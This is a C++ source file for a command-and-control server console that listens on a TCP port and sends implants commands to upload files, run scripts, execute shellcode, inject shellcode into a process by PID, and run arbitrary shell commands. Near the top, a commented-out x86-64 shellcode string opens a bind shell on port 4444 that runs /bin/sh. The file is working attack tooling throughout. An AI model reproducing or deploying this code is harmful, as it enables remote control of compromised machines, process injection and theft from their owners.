#include "CoreC2.hpp"


using namespace std;
using boost::asio::ip::tcp;


// char code[] = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x48\x31\xff\x48\x89\xfa\x48\x83\xc7\x02\x48\x31\xf6\x48\x83\xc6\x01\x48\x31\xc0\x48\x83\xc0\x29\x0f\x05\x48\x89\xc7\x48\x31\xc0\x50\x89\x44\x24\xfc\x66\xc7\x44\x24\xfa\x11\x5c\x66\xc7\x44\x24\xf8\x02\x00\x48\x83\xec\x08\x48\x89\xe6\xba\x10\x00\x00\x00\x48\x83\xc0\x2a\x0f\x05\x48\x31\xf6\x48\x31\xc0\xb0\x21\x0f\x05\x40\xb6\x01\xb0\x21\x0f\x05\x40\xb6\x02\xb0\x21\x0f\x05\x48\x31\xff\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05";


void splitList(std::string list, std::string& delimiter, std::vector<std::string>& splitedList)
{
	size_t pos = 0;
	std::string token;
	while ((pos = list.find(delimiter)) != std::string::npos)
	{
		token = list.substr(0, pos);
		splitedList.push_back(token);
		list.erase(0, pos + delimiter.length());
	}
	splitedList.push_back(list);
}


int CoreC2::createListner()
{
	bool exit=false;
	while(!exit)
	{
		int localPort=5555;
		string localHost="127.0.0.1";

		string input;
		cout << "listner> " ;
		cin >> input;

		if(input=="exit")
			exit=true;
		if(input=="info")
		{
			std::cout << "LPORT " << localPort << std::endl;
			std::cout << "LHOST " << localHost << std::endl;
		}
		if(input=="run")
		{
			Server* server_=new Server(localPort);
			m_serversTcp.push_back(server_);

			exit=true;
		}
	}

	return 0;
}


int CoreC2::PingPong(C2Message &c2Message, C2Message &c2RetMessage)
{
	string out;
	c2Message.SerializeToString(&out);
	m_serversTcp[0]->send(out);

	string ret;
	m_serversTcp[0]->receive(ret);

	c2RetMessage.ParseFromArray(ret.data(), ret.size()); 

	return 0;
}


bool CoreC2::execInstruction(std::vector<std::string>& splitedCmd, C2Message& c2Message)
{
	if(splitedCmd[0]=="upload")
	{
		string inputFile=splitedCmd[1];
		string outputFile=splitedCmd[2];

		std::ifstream input(inputFile, std::ios::binary);
		std::string buffer(std::istreambuf_iterator<char>(input), {});

		c2Message.set_instruction(splitedCmd[0]);
		c2Message.set_inputfile(inputFile);
		c2Message.set_outputfile(outputFile);
		c2Message.set_data(buffer.data(), buffer.size());
	}
	else if(splitedCmd[0]=="exec-asembly")
	{
		string inputFile=splitedCmd[1];

		std::ifstream input(inputFile, std::ios::binary);
		std::string buffer(std::istreambuf_iterator<char>(input), {});

		std::string payload;
		const char* bufferPtr=buffer.data();
		for(int i=0; i<buffer.size()/4; i++)
		{
			unsigned char tmp=0;
			sscanf(bufferPtr, "\\x%2hhx", &tmp);
			bufferPtr+=4;
			payload.push_back(tmp);
		}

		c2Message.set_instruction(splitedCmd[0]);
		c2Message.set_inputfile(inputFile);
		c2Message.set_data(payload.data(), payload.size());
	}
	else if(splitedCmd[0]=="script")
	{
		string inputFile=splitedCmd[1];

		std::ifstream input(inputFile, std::ios::binary);
		std::string buffer(std::istreambuf_iterator<char>(input), {});

		c2Message.set_instruction(splitedCmd[0]);
		c2Message.set_inputfile(inputFile);
		c2Message.set_data(buffer.data(), buffer.size());
	}
	else if(splitedCmd[0]=="inject")
	{
		string inputFile=splitedCmd[1];
		int pid=stoi(splitedCmd[2]);

		std::ifstream input(inputFile, std::ios::binary);
		std::string buffer(std::istreambuf_iterator<char>(input), {});

		std::string payload;
		const char* bufferPtr=buffer.data();
		for(int i=0; i<buffer.size()/4; i++)
		{
			unsigned char tmp=0;
			sscanf(bufferPtr, "\\x%2hhx", &tmp);
			bufferPtr+=4;
			payload.push_back(tmp);
		}

		c2Message.set_instruction(splitedCmd[0]);
		c2Message.set_inputfile(inputFile);
		c2Message.set_pidinjection(pid);
		c2Message.set_data(payload.data(), payload.size());
	}
	else if(splitedCmd[0]=="run")
	{
		string shellCmd;
		for(int i=1; i<splitedCmd.size(); i++)
		{
			shellCmd+=splitedCmd[i];
			shellCmd+=" ";
		}

		c2Message.set_instruction(splitedCmd[0]);
		c2Message.set_shellcmd(shellCmd);
	}

	return 0;
}


int CoreC2::connectSession(int idSession)
{
	bool exit=false;
	while(!exit)
	{
		string data;
		data.resize(1000);

		string cmd;
		cout << "session> " ;
		getline(cin, cmd);

		std::vector<std::string> splitedCmd;
		std::string delimiter=" ";
		splitList(cmd, delimiter, splitedCmd);

		if(splitedCmd[0].empty())
		{
			std::cout << std::endl;
		}
		else if(splitedCmd[0]=="exit")
		{
			exit=true;
		}
		else
		{
			C2Message c2Message;
			execInstruction(splitedCmd, c2Message);

			C2Message c2RetMessage;
			PingPong(c2Message, c2RetMessage);
			std::cout << "output:\n" << c2RetMessage.returnvalue() << std::endl;
		}
	}

	return 0;
}


CoreC2::CoreC2()
{

}


CoreC2::~CoreC2()
{

}


int CoreC2::run()
{
	bool exit=false;
	while(!exit)
	{
		cout << "C2> " ;
		string input;
		cin >> input;

		if(input == "listner")
		{
			createListner();
		}
		else if(input == "beacon")
		{
			createListner();
		}
		else if(input == "session")
		{
			connectSession(0);
		}
		else if(input=="exit")
			exit=true;
	}

	return 0;
}


int main(int argc, char *argv[])
{
	CoreC2 coreC2;
	coreC2.run();
}

